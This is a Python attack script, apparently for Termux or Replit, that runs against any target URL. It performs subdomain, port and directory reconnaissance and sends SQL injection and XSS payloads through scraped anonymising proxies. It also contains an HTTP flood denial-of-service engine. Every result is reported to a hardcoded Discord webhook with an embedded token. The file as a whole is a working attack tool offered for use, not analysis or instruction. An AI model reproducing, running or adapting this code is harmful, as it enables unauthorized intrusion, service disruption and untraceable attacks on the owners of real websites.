#!/usr/bin/env python3
# MOBILE_HAX_FINAL.py – For Termux & Replit
# Install: pip install aiohttp curl_cffi beautifulsoup4 dnspython validators

import asyncio
import aiohttp
import json
import time
import socket
import random
import hashlib
import sys
from urllib.parse import urlparse, parse_qs, urljoin
from collections import defaultdict
import validators
import dns.resolver
from bs4 import BeautifulSoup
from curl_cffi import requests as curl_requests  # optional, falls back to aiohttp

# ---------- CONFIG ----------
DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1485705281399951380/vq0MMpRxWwbxu81_b2sH0NyCuwJNylU105PRJCF37kwFDwuLbRMvnroWGai3a1dZ6ApE"
MAX_CONCURRENT = 100
LOG_FILE = "mobile_hax.log"

seen_vulns = set()

async def send_discord(severity, title, data):
    vuln_hash = hashlib.sha256(f"{title}{json.dumps(data)}".encode()).hexdigest()
    if vuln_hash in seen_vulns:
        return
    seen_vulns.add(vuln_hash)
    payload = {
        "embeds": [{
            "title": f"[{severity}] {title}",
            "description": f"```json\n{json.dumps(data, indent=2)}\n```",
            "color": {"CRITICAL": 0xff0000, "HIGH": 0xff5500, "MEDIUM": 0xffaa00, "INFO": 0x00aaff}[severity]
        }]
    }
    try:
        async with aiohttp.ClientSession() as sess:
            await sess.post(DISCORD_WEBHOOK, json=payload, timeout=5)
    except:
        pass

# ---------- PROXY MANAGER (VALIDATED) ----------
class ProxyManager:
    def __init__(self):
        self.proxies = []
        self.scores = defaultdict(float)
        self.lock = asyncio.Lock()
    
    async def fetch_proxies(self):
        # Free proxy lists (works on Replit/Termux)
        urls = [
            "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=5000&country=all",
            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt"
        ]
        raw = set()
        for url in urls:
            try:
                async with aiohttp.ClientSession() as sess:
                    async with sess.get(url, timeout=10) as resp:
                        text = await resp.text()
                        for line in text.splitlines():
                            line = line.strip()
                            if ":" in line and not line.startswith("#"):
                                raw.add(f"http://{line}")
            except:
                pass
        # Validate each proxy (2 success out of 3)
        for proxy in raw:
            score = 0
            for _ in range(3):
                try:
                    async with aiohttp.ClientSession() as sess:
                        async with sess.get("http://httpbin.org/ip", proxy=proxy, timeout=5) as resp:
                            if resp.status == 200:
                                score += 1
                except:
                    pass
            if score >= 2:
                self.proxies.append(proxy)
                self.scores[proxy] = score / 3
        self.proxies.sort(key=lambda p: self.scores[p], reverse=True)
        return self.proxies[:30]
    
    async def get_proxy(self):
        async with self.lock:
            if not self.proxies:
                await self.fetch_proxies()
            if not self.proxies:
                return None
            top = max(1, len(self.proxies)//10)
            proxy = random.choice(self.proxies[:top])
            self.scores[proxy] *= 0.99
            return proxy

proxy_manager = ProxyManager()

# ---------- SQLi ENGINE (NO FALSE POSITIVES) ----------
class SQLiEngine:
    def __init__(self, url):
        self.url = url
        self.baseline_time = None
        self.baseline_length = None
    
    async def get_baseline(self, param, value):
        clean_url = f"{self.url}?{param}={value}"
        start = time.time()
        proxy = await proxy_manager.get_proxy()
        async with aiohttp.ClientSession() as sess:
            async with sess.get(clean_url, proxy=proxy) as resp:
                text = await resp.text()
                self.baseline_time = time.time() - start
                self.baseline_length = len(text)
    
    async def test_time_based(self, param, value):
        await self.get_baseline(param, value)
        payloads = [
            f"1' AND (SELECT * FROM (SELECT(SLEEP(5)))a) AND '1'='1",
            f"1\" AND SLEEP(5) AND \"1\"=\"1"
        ]
        for payload in payloads:
            test_url = f"{self.url}?{param}={value}{payload}"
            start = time.time()
            try:
                proxy = await proxy_manager.get_proxy()
                async with aiohttp.ClientSession() as sess:
                    async with sess.get(test_url, timeout=10, proxy=proxy) as resp:
                        elapsed = time.time() - start
                        if elapsed > self.baseline_time + 4:
                            await send_discord("CRITICAL", "SQLi Time-Based", {"url": test_url, "delay": elapsed})
                            return True
            except:
                pass
        return False
    
    async def test_boolean(self, param, value):
        true_payload = f"1' AND '1'='1"
        false_payload = f"1' AND '1'='2"
        true_url = f"{self.url}?{param}={value}{true_payload}"
        false_url = f"{self.url}?{param}={value}{false_payload}"
        proxy = await proxy_manager.get_proxy()
        async with aiohttp.ClientSession() as sess:
            async with sess.get(true_url, proxy=proxy) as r1:
                len_true = len(await r1.text())
            async with sess.get(false_url, proxy=proxy) as r2:
                len_false = len(await r2.text())
            if abs(len_true - len_false) > 50:
                await send_discord("HIGH", "SQLi Boolean-Based", {"url": true_url, "diff": abs(len_true - len_false)})
                return True
        return False
    
    async def run(self):
        parsed = urlparse(self.url)
        if not parsed.query:
            return
        params = parse_qs(parsed.query)
        for param, vals in params.items():
            orig = vals[0]
            if await self.test_time_based(param, orig):
                break
            await self.test_boolean(param, orig)

# ---------- XSS ENGINE (CONTEXT-AWARE, NO BROWSER) ----------
class XSSEngine:
    def __init__(self, url):
        self.url = url
    
    def is_executable_context(self, html, payload):
        """Check if payload appears in a context where it can execute"""
        soup = BeautifulSoup(html, 'html.parser')
        # Check in <script> tags
        for script in soup.find_all('script'):
            if payload in script.string:
                return True
        # Check in event handlers
        for tag in soup.find_all():
            for attr, value in tag.attrs.items():
                if attr.startswith('on') and payload in value:
                    return True
        # Check in javascript: URIs
        for a in soup.find_all('a', href=True):
            if 'javascript:' in a['href'] and payload in a['href']:
                return True
        return False
    
    async def test_reflected(self, param, value, payload):
        test_url = f"{self.url}?{param}={value}{payload}"
        proxy = await proxy_manager.get_proxy()
        async with aiohttp.ClientSession() as sess:
            async with sess.get(test_url, proxy=proxy) as resp:
                html = await resp.text()
                if self.is_executable_context(html, payload):
                    await send_discord("HIGH", "XSS Confirmed (Context-Aware)", {"url": test_url, "payload": payload})
                    return True
        return False
    
    async def run(self):
        parsed = urlparse(self.url)
        if not parsed.query:
            return
        params = parse_qs(parsed.query)
        payloads = ["<script>alert(1)</script>", "\"><img src=x onerror=alert(1)>", "javascript:alert(1)"]
        for param, vals in params.items():
            orig = vals[0]
            for p in payloads:
                if await self.test_reflected(param, orig, p):
                    break

# ---------- DDoS (CONTROLLED ASYNC) ----------
class DDoSEngine:
    def __init__(self, target, duration=30, rate=300):
        self.target = target
        self.duration = duration
        self.rate = rate
        self.sem = asyncio.Semaphore(MAX_CONCURRENT)
    
    async def http_flood(self):
        headers = {"User-Agent": f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/{random.randint(500,537)}.36"}
        async with aiohttp.ClientSession() as sess:
            while self.running:
                await self.sem.acquire()
                try:
                    proxy = await proxy_manager.get_proxy()
                    await sess.get(self.target, headers=headers, proxy=proxy, timeout=3)
                except:
                    pass
                finally:
                    self.sem.release()
                await asyncio.sleep(1/self.rate)
    
    async def start(self):
        self.running = True
        tasks = [asyncio.create_task(self.http_flood()) for _ in range(MAX_CONCURRENT//5)]
        await asyncio.sleep(self.duration)
        self.running = False
        for t in tasks:
            t.cancel()
        await send_discord("INFO", "DDoS finished", {"target": self.target})

# ---------- RECON ----------
async def subdomain_enum(domain):
    wordlist = ["www", "mail", "admin", "api", "dev", "test", "vpn", "secure", "portal", "cdn", "ftp"]
    async def check(sub):
        full = f"{sub}.{domain}"
        try:
            ip = socket.gethostbyname(full)
            await send_discord("INFO", "Subdomain", {"subdomain": full, "ip": ip})
        except:
            pass
    await asyncio.gather(*[check(sub) for sub in wordlist])

async def port_scan(host):
    common_ports = [21,22,23,25,53,80,110,443,3306,3389,8080,8443]
    async def scan(port):
        try:
            _, writer = await asyncio.open_connection(host, port)
            writer.close()
            await writer.wait_closed()
            await send_discord("INFO", "Open port", {"host": host, "port": port})
        except:
            pass
    await asyncio.gather(*[scan(p) for p in common_ports])

async def dir_brute(target):
    dirs = ["admin", "wp-admin", "login", "phpmyadmin", "backup", "config", ".git", ".env", "api", "dashboard"]
    async def check(d):
        url = urljoin(target, d)
        proxy = await proxy_manager.get_proxy()
        try:
            async with aiohttp.ClientSession() as sess:
                async with sess.get(url, proxy=proxy) as resp:
                    if resp.status == 200:
                        await send_discord("MEDIUM", "Directory found", {"url": url})
        except:
            pass
    await asyncio.gather(*[check(d) for d in dirs])

# ---------- MAIN ----------
async def main():
    if len(sys.argv) < 2:
        target = input("Target URL: ")
    else:
        target = sys.argv[1]
    if not validators.url(target):
        print("Invalid URL")
        return
    parsed = urlparse(target)
    domain = parsed.netloc.split(":")[0]
    await send_discord("INFO", "Attack started", {"target": target})
    # Recon
    await subdomain_enum(domain)
    await port_scan(domain)
    await dir_brute(target)
    # Exploit
    sqli = SQLiEngine(target)
    await sqli.run()
    xss = XSSEngine(target)
    await xss.run()
    # Optional DDoS (uncomment)
    # ddos = DDoSEngine(target, duration=30)
    # await ddos.start()
    await send_discord("INFO", "Attack finished", {"target": target})

if __name__ == "__main__":
    asyncio.run(main())
